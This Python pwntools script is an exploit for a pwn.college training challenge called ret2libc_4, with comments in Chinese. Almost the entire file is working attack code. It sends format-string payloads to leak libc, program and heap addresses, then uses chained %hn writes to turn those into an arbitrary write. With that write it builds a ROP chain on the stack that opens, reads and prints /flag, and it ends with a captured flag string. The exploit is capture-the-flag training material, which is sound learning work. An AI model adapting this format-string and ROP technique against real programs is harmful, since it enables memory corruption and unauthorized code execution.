#!/usr/bin/env python

from pwn import *

context(arch="amd64", os="linux")
p = process("/challenge/ret2libc_4")
print("pidof ret2libc_4:", proc.pidof(p)[0])
p.interactive()


# 利用思路
# 利用栈中保存的地址p1（第15个参数），修改栈中p1指向的位置的数据（p2）
# 利用p2（第43个参数）修改栈中其他的4个地址(p3,p4,p5,p6)，分别指向返回地址的4个部分，每部分两字节
# 利用p3,p4,p5,p6（第45,46,47,48个参数），实现对堆栈中数据的修改，构造ROP链

# 利用rcx（第3个参数）寄存器中的地址（libc_2.31.so:__write+17）计算libc加载地址
# 利用保存的返回地址（第9个参数）计算加载地址

libc_offset = 0x10e077
libc_base = 0xffffffffffffffff
proc_offset =0x140e
proc_base = 0xffffffffffffffff

system_offset = 0x52290
open_offset = 0x10dce0
read_offset = 0x10dfc0
puts_offset = 0x84420

heap_buf_addr = 0xffffffffffffffff

# ROPgadget libc
pop_offset = 0x1587d2 # pop rdx; pop rcx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
pop_rdi_offset = 0x23b6a # pop rdi ; ret
pop_rsi_offset = 0x2601f # pop rsi ; ret
pop_rdx_offset = 0x142c92 # pop rdx ; ret

# 构造ROP链

# saved_rbp
# ret -> pop
#
#
#
#
#
# p2 第15个参数
#
# ret -> pop_rsi
# rsi = 0
# ret -> pop_rdi
# rdi = buf+0x10
# ret -> open
# ret -> pop_rdx
# rdx = 0x100
# ret -> pop_rsi
# rsi = buf+0x10
# ret -> pop_rdi
# rdi = 3
# ret -> read
# ret -> pop_rdi
# rdi = buf
# ret -> puts

p1 = 0xffffffffffffffff # 指向p2
p2 = 0xffffffffffffffff # 依次利用p2修改p3,p4,p5,p6

# 将字符串存入缓冲区
p.sendline(b'3')
p.send(b'\n==============\n/flag')
p.clean()

# 获取返回地址，计算程序加载地址
# 获取堆地址
# 计算libc加载地址
p.sendline(b'3')
payload = b"%3$p\n%7$p\n%9$p\n%15$p\n"
p.send(payload)
lines = p.recvlines(numlines=6)
# print(lines)
# exit()
libc_base = int(lines[2], 16) - libc_offset
proc_base = int(lines[4], 16) - proc_offset
print("libc_base:", hex(libc_base))
print("proc_base:", hex(proc_base))
heap_buf_addr = int(lines[3], 16) - 0x110 # 实际上在上一个malloc的缓冲区
print("heap buffer:", hex(heap_buf_addr))
p1 = int(lines[5], 16)
# p.interactive()

def write(uint64_addr, uint64_data, br=False):
    p3_offset = 0x10
    p4_offset = 0x18
    p5_offset = 0x20
    p6_offset = 0x28
    p3 = uint64_addr + 0
    p4 = uint64_addr + 2
    p5 = uint64_addr + 4
    p6 = uint64_addr + 6
    print("p1:", hex(p1))
    print("p3:", hex(p3))
    print("p4:", hex(p4))
    print("p5:", hex(p5))
    print("p6:", hex(p6))
    print("data:", hex(uint64_data))
    # p.interactive()
    # 使p2指向p3，修改p3
    p.sendline(b'3')
    p2 = p1 + p3_offset
    payload = "%{}x%15$hn".format(p2 & 0xffff).encode()
    p.send(payload)
    p.clean()

    p.sendline(b'3')
    payload = "%{}x%43$hn".format(p3 & 0xffff).encode()
    p.send(payload)
    p.clean()

    # 使p2指向p4，修改p4
    p.sendline(b'3')
    p2 = p1 + p4_offset
    payload = "%{}x%15$hn".format(p2 & 0xffff).encode()
    p.send(payload)
    p.clean()

    p.sendline(b'3')
    payload = "%{}x%43$hn".format(p4 & 0xffff).encode()
    p.send(payload)
    p.clean()

    # 使p2指向p5，修改p5
    p.sendline(b'3')
    p2 = p1 + p5_offset
    payload = "%{}x%15$hn".format(p2 & 0xffff).encode()
    p.send(payload)
    p.clean()

    p.sendline(b'3')
    payload = "%{}x%43$hn".format(p5 & 0xffff).encode()
    p.send(payload)
    p.clean()

    # 使p2指向p6，修改p6
    p.sendline(b'3')
    p2 = p1 + p6_offset
    payload = "%{}x%15$hn".format(p2 & 0xffff).encode()
    p.send(payload)
    p.clean()

    p.sendline(b'3')
    payload = "%{}x%43$hn".format(p6 & 0xffff).encode()
    p.send(payload)
    p.clean()

    if (br == True):
        # 检查是否修改成功
        p.sendline(b'3')
        payload = b"%45$p\n%46$p\n%47$p\n%48$p\n"
        p.send(payload)
        lines = p.recvlines(numlines=7)
        print("p3", lines[2])
        print("p4", lines[3])
        print("p5", lines[4])
        print("p6", lines[5])
        p.clean()
        p.interactive()

    # 利用p3,p4,p5,p6修改堆栈内存
    p.sendline(b'3')
    payload = b""
    len0 = 0x0
    len1 = (((uint64_data >> 0) & 0xffff) - len0) % 0x10000
    if (len1 <= 8):
        len1 += 0x10000
    len0 += len1
    len2 = (((uint64_data >> 16) & 0xffff) - len0) % 0x10000
    if (len2 <= 8):
        len2 += 0x10000
    len0 += len2
    len3 = (((uint64_data >> 32) & 0xffff) - len0) % 0x10000
    if (len3 <= 8):
        len3 += 0x10000
    len0 += len3
    len4 = (((uint64_data >> 48) & 0xffff) - len0) % 0x10000
    if (len4 <= 8):
        len4 += 0x10000

    payload += "%{}x%45$hn".format(len1).encode() # 依次修改两个字节
    payload += "%{}x%46$hn".format(len2).encode() # 依次修改两个字节
    payload += "%{}x%47$hn".format(len3).encode() # 依次修改两个字节
    payload += "%{}x%48$hn".format(len4).encode() # 依次修改两个字节
    p.send(payload)


# 开始构造ROP链
print("第一次修改：")
addr = p1 - 0xd0
data = pop_rsi_offset + libc_base
write(addr, data) # pop rsi
p.clean()
p.sendline(b'3')
p.send("%9$p\n%{}$p\n".format((0xd0-p1+addr)//8+17).encode())
print(p.recvlines(numlines=4)[2:])

print("第二次修改：")
addr = p1 - 0xc8
data = 0
write(addr, data) # rsi=0
p.clean()
p.sendline(b'3')
p.send("%9$p\n%{}$p\n".format((0xd0-p1+addr)//8+17).encode())
print(p.recvlines(numlines=4)[2:])

print("第三次修改：")
addr = p1 - 0xc0
data = pop_rdi_offset + libc_base
write(addr, data) # pop rdi
p.clean()
p.sendline(b'3')
p.send("%9$p\n%{}$p\n".format((0xd0-p1+addr)//8+17).encode())
print(p.recvlines(numlines=4)[2:])

print("第四次修改：")
addr = p1 - 0xb8
data = heap_buf_addr+0x10
write(addr, data) # rdi=buf+0x10
p.clean()
p.sendline(b'3')
p.send("%9$p\n%{}$p\n".format((0xd0-p1+addr)//8+17).encode())
print(p.recvlines(numlines=4)[2:])

print("第五次修改：")
addr = p1 - 0xb0
data = open_offset + libc_base
write(addr, data) # open(buf+0x10, 0)
p.clean()
p.sendline(b'3')
p.send("%9$p\n%{}$p\n".format((0xd0-p1+addr)//8+17).encode())
print(p.recvlines(numlines=4)[2:])

print("第六次修改：")
addr = p1 - 0xa8
data = pop_rdx_offset + libc_base
write(addr, data) # pop rdx
p.clean()
p.sendline(b'3')
p.send("%9$p\n%{}$p\n".format((0xd0-p1+addr)//8+17).encode())
print(p.recvlines(numlines=4)[2:])

print("第七次修改：")
addr = p1 - 0xa0
data = 0x100
write(addr, data) # rdx=0x100
p.clean()
p.sendline(b'3')
p.send("%9$p\n%{}$p\n".format((0xd0-p1+addr)//8+17).encode())
print(p.recvlines(numlines=4)[2:])

print("第八次修改：")
addr = p1 - 0x98
data = pop_rsi_offset + libc_base
write(addr, data) # pop rsi
p.clean()
p.sendline(b'3')
p.send("%9$p\n%{}$p\n".format((0xd0-p1+addr)//8+17).encode())
print(p.recvlines(numlines=4)[2:])

print("第九次修改：")
addr = p1 - 0x90
data = heap_buf_addr+0x10
write(addr, data) # rsi=buf+0x10
p.clean()
p.sendline(b'3')
p.send("%9$p\n%{}$p\n".format((0xd0-p1+addr)//8+17).encode())
print(p.recvlines(numlines=4)[2:])

print("第十次修改：")
addr = p1 - 0x88
data = pop_rdi_offset + libc_base
write(addr, data) # pop rdi
p.clean()
p.sendline(b'3')
p.send("%9$p\n%{}$p\n".format((0xd0-p1+addr)//8+17).encode())
print(p.recvlines(numlines=4)[2:])

print("第十一次修改：")
addr = p1 - 0x80
data = 3
write(addr, data) # rdi=3
p.clean()
p.sendline(b'3')
p.send("%9$p\n%{}$p\n".format((0xd0-p1+addr)//8+17).encode())
print(p.recvlines(numlines=4)[2:])

print("第十二次修改：")
addr = p1 - 0x78
data = read_offset + libc_base
write(addr, data) # read(3, buf+0x10, 0x100)
p.clean()
p.sendline(b'3')
p.send("%9$p\n%{}$p\n".format((0xd0-p1+addr)//8+17).encode())
print(p.recvlines(numlines=4)[2:])

print("第十三次修改：")
addr = p1 - 0x70
data = pop_rdi_offset + libc_base
write(addr, data) # pop rdi
p.clean()
p.sendline(b'3')
p.send("%9$p\n%{}$p\n".format((0xd0-p1+addr)//8+17).encode())
print(p.recvlines(numlines=4)[2:])

print("第十四次修改：")
addr = p1 - 0x68
data = heap_buf_addr
write(addr, data) # rdi=buf
p.clean()
p.sendline(b'3')
p.send("%9$p\n%{}$p\n".format((0xd0-p1+addr)//8+17).encode())
print(p.recvlines(numlines=4)[2:])

print("第十五次修改：")
addr = p1 - 0x60
data = puts_offset + libc_base
write(addr, data) # puts(buf)
p.clean()
p.sendline(b'3')
p.send("%9$p\n%{}$p\n".format((0xd0-p1+addr)//8+17).encode())
print(p.recvlines(numlines=4)[2:])

# 修改返回地址
addr = p1 - 0x110
data = pop_offset + libc_base
write(addr, data) # pop rdx; pop rcx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
p.sendafter(b'==============', b'')
p.interactive()

# pwn.college{IoxZPkZGCGZgBlMLq_eNrRk0IhB.QXyMDLyEzW}
